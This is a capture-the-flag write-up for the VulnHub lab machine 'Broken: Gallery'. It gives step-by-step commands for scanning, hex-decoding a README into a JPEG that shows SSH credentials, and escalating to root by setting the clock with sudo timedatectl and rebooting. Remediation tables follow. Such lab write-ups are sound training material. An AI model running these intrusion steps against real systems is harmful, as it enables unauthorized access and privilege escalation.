# Broken: Gallery — Writeup

> *A web gallery that hex-encodes a JPEG into a README, that JPEG contains the SSH password, and once you are in the init scripts set the root password when the clock hits a magic timestamp from 2015. Bruh, who designed this and why does sudo timedatectl exist for a non-admin user? Noice box though, the time manipulation angle is genuinely creative.*

---

## Machine Metadata

| Field | Value |
|---|---|
| **Level** | Easy |
| **Target VM** | Broken: Gallery |
| **Attacker VM** | Kali Linux 2024.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/broken-gallery,/ |
| **Techniques** | Hex-to-binary decoding, steganography (credentials in image), SSH login, bash history disclosure, sudo timedatectl time manipulation, init script privilege escalation |
| **CVEs** | None (misconfiguration chain) |
| **APT Relevance** | Time-based trigger mechanisms are used in APT implants (e.g., scheduled C2 callback windows); sudo misconfiguration for system utilities (timedatectl, systemctl) is a common Linux privesc finding documented by Red Canary and MITRE |

---

## Attack Summary

```
[Attacker]
      |
      v
netdiscover + nmap -A 192.168.1.107
--> 22/tcp (SSH), 80/tcp (HTTP Apache)
      |
      v
Browse http://192.168.1.107/
wget README.md from gallery page
      |
      v
README.md contains long hex string
xxd -r -p --> decoded.jpg (JPEG)
Open JPEG --> SSH credentials visible: broken:<password>
      |
      v
ssh broken@192.168.1.107
sudo -l --> NOPASSWD: /bin/timedatectl, /sbin/reboot
      |
      v
cat ~/.bash_history
--> reference to /etc/init.d/password-policy.sh
cat /etc/init.d/password-policy.sh
--> changes root password when date == "2015-11-20 16:14:50"
      |
      v
sudo timedatectl set-time '2015-11-20 16:14:50'
sudo /sbin/reboot
      |
      v
SSH reconnect as broken
su root
Password: TodayIsAgoodDay
--> uid=0(root)
    [ROOT]
```

---

## Methodology

1. Network discovery: host identification and service enumeration
2. Web enumeration: download gallery files and inspect README.md
3. Hex decode: convert hex string to binary JPEG file
4. Credential extraction from image file
5. SSH login with discovered credentials
6. Bash history disclosure and init script analysis
7. Privilege escalation: sudo timedatectl time manipulation to trigger password-change init script

---

## Steps

### Step 1: Host Discovery and Port Scan

**Context:** Discover the target IP on the local network and perform a full service scan to map the attack surface.

```bash
netdiscover -r 192.168.1.0/24
nmap -A 192.168.1.107 -oN nmap-gallery.txt
```

**Expected output:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH x.x
80/tcp open  http    Apache httpd 2.x
```

**Alternatives:** `arp-scan -l` for quick host discovery without broadcast noise; `rustscan -a 192.168.1.107` for faster port enumeration.

**Real-world note:** A two-port surface (SSH + HTTP) is typical for a focused embedded Linux appliance or a simple web server. In real engagements, both ports get fully enumerated: SSH version, banner grabbing, HTTP headers, server technology stack.

**MITRE TTP:** T1595.001 - Active Scanning: Scanning IP Blocks | T1046 - Network Service Discovery

---

### Step 2: Web Enumeration and README Download

**Context:** The HTTP service hosts a gallery page with downloadable files. A `README.md` file is accessible directly and contains the first clue.

```bash
# Browse to:
http://192.168.1.107/

# Download the README:
wget http://192.168.1.107/README.md
cat README.md
```

**Expected output:**
```
(long hex string, many characters)
4a46494600010100...
```

**Alternatives:** `curl -s http://192.168.1.107/README.md -o README.md`; use gobuster to find other files: `gobuster dir -u http://192.168.1.107/ -w /usr/share/seclists/Discovery/Web-Content/common.txt`.

**Real-world note:** Files named `README`, `NOTES`, `TODO`, `config.bak`, `backup.zip` on public-facing web servers are a classic source of sensitive data. Automated scanners and bug bounty recon tools (gau, katana, hakrawler) enumerate these paths routinely.

**MITRE TTP:** T1083 - File and Directory Discovery | T1552.001 - Unsecured Credentials: Credentials In Files

---

### Step 3: Hex Decode to JPEG and Credential Extraction

**Context:** The hex string in README.md is a raw binary file encoded as hex. Decoding it yields a JPEG image. The credentials for user `broken` are visible in the image content.

```bash
cat README.md | xxd -r -p > decoded.jpg
file decoded.jpg
# Output: JPEG image data, JFIF standard 1.01
```

Open `decoded.jpg` in an image viewer. The SSH password is displayed visually in the image.

**Alternatives:**
```bash
# Python one-liner:
python3 -c "import binascii; open('decoded.jpg','wb').write(binascii.unhexlify(open('README.md').read().strip()))"

# Check for embedded data (steganography):
steghide info decoded.jpg
exiftool decoded.jpg
strings decoded.jpg | grep -i pass
```

**Real-world note:** Credentials embedded in image files survive most text-based secrets scanning. Tools like `truffleHog v3` now support binary file scanning, but images are still a blind spot for many CI/CD pipelines. Penetration testers check all downloadable media during web app assessments.

**MITRE TTP:** T1552.001 - Unsecured Credentials: Credentials In Files

---

### Step 4: SSH Login

**Context:** With the credentials extracted from the decoded JPEG, log in as user `broken` via SSH and immediately check sudo rights.

```bash
ssh broken@192.168.1.107
# Enter password from the image

sudo -l
```

**Expected output:**
```
User broken may run the following commands on gallery:
    (root) NOPASSWD: /bin/timedatectl
    (root) NOPASSWD: /sbin/reboot
```

**Real-world note:** The presence of `NOPASSWD` sudo rules for system utilities is a red flag in any security audit. `timedatectl` and `reboot` should never be delegated to non-admin users; they provide indirect control over system integrity and boot-time scripts.

**MITRE TTP:** T1078.003 - Valid Accounts: Local Accounts | T1021.004 - Remote Services: SSH

---

### Step 5: Bash History Disclosure and Init Script Discovery

**Context:** Check `.bash_history` for the `broken` user. Previous commands reveal a reference to a password-policy initialization script.

```bash
cat ~/.bash_history
```

**Expected output (relevant excerpt):**
```
cat /etc/init.d/password-policy.sh
```

**Read the script:**
```bash
cat /etc/init.d/password-policy.sh
```

**Expected content (simplified logic):**
```bash
#!/bin/bash
if [ "$(date '+%Y-%m-%d %H:%M:%S')" == "2015-11-20 16:14:50" ]; then
    echo "root:TodayIsAgoodDay" | chpasswd
fi
```

**Real-world note:** `.bash_history` is a goldmine for forensic investigators and attackers alike. It reveals commands executed, scripts referenced, paths accessed, and sometimes credentials. Production hardening: set `HISTFILE=/dev/null` for service accounts, set `HISTSIZE=0`, and restrict read permissions on `.bash_history` to the owning user only.

**MITRE TTP:** T1552.003 - Unsecured Credentials: Bash History | T1083 - File and Directory Discovery

---

### Step 6: Privilege Escalation via sudo timedatectl and Reboot

**Context:** The init script changes the root password only when the system clock matches `2015-11-20 16:14:50`. With `sudo timedatectl`, set the time to match, then reboot to trigger all init scripts as root.

```bash
# Set system time to trigger the condition:
sudo timedatectl set-time '2015-11-20 16:14:50'

# Verify (optional):
date

# Reboot to execute init scripts:
sudo /sbin/reboot
```

**Wait for the machine to come back online, then reconnect:**
```bash
ssh broken@192.168.1.107

# Switch to root with the newly set password:
su root
# Password: TodayIsAgoodDay

id
# uid=0(root) gid=0(root) groups=0(root)
```

**Expected output:**
```
root@gallery:~# id
uid=0(root) gid=0(root) groups=0(root)
root@gallery:~# cat /root/root.txt
[ROOT FLAG]
```

**Alternatives:** If `timedatectl` is NTP-synced and rejects manual changes, disable NTP first: `sudo timedatectl set-ntp false` then set time.

**Real-world note:** Time-based security conditions (scheduled password changes, certificate validity windows, license checks) are inherently bypassable by any user with system time control. In ICS/OT environments, time manipulation is a documented attack technique (MITRE ICS T0895). NTP servers should be hardened and system time manipulation should require privileged access.

**MITRE TTP:** T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching | T1053 - Scheduled Task/Job (init script trigger)

---

## Captured Flags, Hashes, and Credentials

| Type | Value | Where Found | Used For |
|---|---|---|---|
| Credential | `broken:<password from JPEG>` | Decoded JPEG from hex in README.md | SSH login |
| Root Credential | `root:TodayIsAgoodDay` | /etc/init.d/password-policy.sh (triggered) | Root access |
| Root Flag | `/root/root.txt` | Post-escalation | Machine completion |

---

## Lessons Learned

| Finding | Real-World Relevance |
|---|---|
| Credentials visible in a publicly downloadable image file | Images are a blind spot for most automated secrets scanners. Manual review of all downloadable content is required in web app assessments. |
| Hex encoding as "obfuscation" | Like Base64, hex encoding is trivially reversible. It provides zero security. Use proper encryption or a secrets manager. |
| sudo timedatectl granted to non-admin user | System time control allows bypassing any time-dependent security condition. Restrict to root. NTP manipulation is a real attacker technique. |
| sudo reboot granted to non-admin user | Reboot triggers all init scripts as root. Any init script with exploitable logic becomes a privesc vector. |
| Password-changing init script based on timestamp | Time-based password changes are fragile and exploitable. Use PAM modules, central identity management (LDAP, AD), or a secrets rotation tool. |
| .bash_history leaking script paths | History files reveal operational details. Sanitize history for service accounts and restrict file permissions. |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Reconnaissance | Active Scanning: Scanning IP Blocks | T1595.001 |
| Discovery | Network Service Discovery | T1046 |
| Discovery | File and Directory Discovery | T1083 |
| Credential Access | Unsecured Credentials: Credentials In Files | T1552.001 |
| Credential Access | Unsecured Credentials: Bash History | T1552.003 |
| Initial Access | Valid Accounts: Local Accounts (SSH) | T1078.003 |
| Lateral Movement | Remote Services: SSH | T1021.004 |
| Privilege Escalation | Abuse Elevation Control Mechanism: Sudo | T1548.003 |
| Privilege Escalation | Boot or Logon Initialization Scripts | T1037 |

---

## Remediation

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | ID.AM-2 | Inventory all web-accessible files; remove unnecessary downloadable content |
| Protect | PR.AC-4 | Remove timedatectl and reboot from sudoers for non-admin accounts |
| Protect | PR.DS-1 | Never store credentials in image files or publicly accessible documents |
| Detect | DE.CM-3 | Monitor for sudo timedatectl/reboot and init script modifications |
| Protect | PR.IP-1 | Replace time-based init script conditions with proper identity management |

### NIST SP 800-53 Controls

| Control | Requirement | Applicability |
|---|---|---|
| IA-5 | Authenticator Management | Credentials must not be embedded in media files or public documents |
| AC-6 | Least Privilege | Remove timedatectl and reboot from unprivileged sudo rules |
| CM-6 | Configuration Settings | Audit sudoers regularly; remove all NOPASSWD entries for system utilities |
| AU-9 | Protection of Audit Information | Restrict .bash_history permissions; sanitize history for service accounts |
| SC-45 | System Time Services | Restrict system time modification to root; use authenticated NTP |

### CISA KEV Relevance

No direct CVEs. Sudo misconfiguration (similar to CVE-2021-3156 sudo heap overflow, CVE-2019-14287 sudo bypass) is a persistent class of privilege escalation. CISA recommends regular sudo audit as part of baseline hardening for all Linux systems.

### C2M2 (Cybersecurity Capability Maturity Model)

| Domain | Practice | Gap |
|---|---|---|
| ACM | ACM-2b | No review of publicly downloadable content = MIL0 |
| IAM | IAM-2a | Unrestricted sudo for system utilities = MIL0 |
| SA | SA-1a | No monitoring of init script modifications = MIL0 |

### MITRE D3FEND Countermeasures

| D3FEND Technique | ID | Defends Against |
|---|---|---|
| Credential Hardening | D3-CH | Credential embedded in image file |
| User Behavior Analysis | D3-UBA | Anomalous timedatectl and reboot via sudo |
| System Call Analysis | D3-SCA | Init script chpasswd execution at boot |
| File Content Rules | D3-FCR | Detect credential patterns in downloadable files |

---

## Final Thoughts

Broken: Gallery is a sneaky easy box that teaches credential hunting in unexpected places. The hex-in-README-to-JPEG decode is legit a fun puzzle, and the `sudo timedatectl` + init script pivot is one of the more creative privesc paths you will find on a beginner machine. The real takeaway: never assume that because something is "just an image" or "just a README" it can't harbor sensitive data. And whoever put `timedatectl` in sudoers: dude, that is not okay. But thanks for the root shell. GG.

Thanks guys!! (❍ᴥ❍ʋ)
